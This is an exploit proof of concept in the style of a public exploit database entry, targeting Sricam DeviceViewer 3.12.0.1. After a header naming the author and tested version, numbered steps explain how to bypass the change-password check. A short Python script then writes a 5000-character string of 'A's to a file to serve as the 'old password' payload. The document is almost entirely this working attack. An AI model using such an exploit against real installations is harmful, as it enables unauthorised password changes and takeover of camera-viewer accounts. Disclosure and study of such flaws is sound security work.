# Exploit Title: DeviceViewer 3.12.0.1 - Arbitrary password change
# Date: 10/09/2019
# Exploit Author: Alessandro Magnosi
# Vendor Homepage: http://www.sricam.com/
# Software Link: http://download.sricam.com/Manual/DeviceViewer.exe
# Version: v3.12.0.1
# Tested on: Windows 7

#!/usr/bin/python

# Steps to reproduce:
#   1. Generate the payload executing the PoC
#   2. Login in the Sricam DeviceViewer application as any registered user
#   3. Go to System Tools -> Change Password
#   4. Set the old password as the malicious payload, and the new password as whatever you want
#   5. The password will be changed with the new one
#   6. To confirm, restart the application and try to login with the new password

payload = "A" * 5000

try:
	bypass = open("bypass.txt","w")
	print("### Sricam DeviceViewer 3.12.0.1 Change Password Security Bypass")
	print("### Author: Alessandro Magnosi\n")
	print("[*] Creating old password file")
	bypass.write(payload)
	bypass.close()
	print("[+] Old password file created\n")
	print("[i] When changing password, set the old password to the file contents")
	print("[i] Close the program and reopen it")
	print("[i] Log in with new password")
except:
	print("[!] Error creating the file")
            